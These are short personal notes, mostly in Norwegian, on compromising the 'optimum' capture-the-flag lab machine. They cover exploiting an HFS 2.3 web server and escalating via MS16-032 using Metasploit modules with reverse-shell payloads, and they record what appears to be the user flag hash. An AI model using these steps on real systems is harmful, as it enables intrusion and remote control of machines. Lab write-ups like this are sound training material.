## optimum 10.10.10.8

windows server 2012 x64

nmap port 80

hfs 2.3 server. finnes exploit

kjørte i metasploit exploit/windows/http/rejetto\_hfs\_exec

sett srvhost til samme som lhost men ikke srvport

husk å sette lhost også

`use post/multi/manage/shell_to_meterpreter`

user.txt **d0c39409d7b994a9a1389ebf38ef5f73**

MS16-032 SYSTEM Privilege Escalation

prøvd å laste opp ps1-script og får kjørt det, men prosessen ligger i bakgrunnen.- sjekk ps kommando

må finne en måte å få reverse shell fra powershellet

`use exploit/windows/local/ms16_032_secondary_logon_handle_privesc`

tror denne er riktig.

`use post/multi/recon/local_exploit_suggester`**  **

```
use exploit/windows/local/payload_inject
```

```
set payload windows/powershell_reverse_tcp
```

Import-Module ./lol.ps1

Invoke-MS16-032

gjøre fra 32 til 64 bit shell

`use windows/local/payload_inject`

`set payload windows/x64/meterpreter/reverse_tcp`







